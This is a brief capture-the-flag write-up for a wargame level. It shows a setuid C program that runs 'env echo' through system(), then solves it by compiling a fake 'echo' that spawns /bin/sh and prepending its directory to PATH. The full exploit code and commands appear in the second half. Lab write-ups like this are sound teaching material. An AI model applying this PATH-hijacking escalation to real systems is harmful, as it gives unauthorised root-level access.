# Level 01

This chall provide us with this source code:

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
```

Here is the part of the code we're interested in:
```c
system("/usr/bin/env echo and now what?");
```
What this line does is that `/usr/bin/env` will run the `echo and now what?` in a specified environment.
So we just need to change our `$PATH`

we will create a binary that open up a shell on `/tmp` and add it to the path.

```c
#include <stdlib.h>

int main() {
    system("/bin/sh");
    return 0;
}
```

```
>> gcc -o /home/level01/echo /tmp/a.c
>> PATH=/home/level01:$PATH /home/flag01/flag01
```
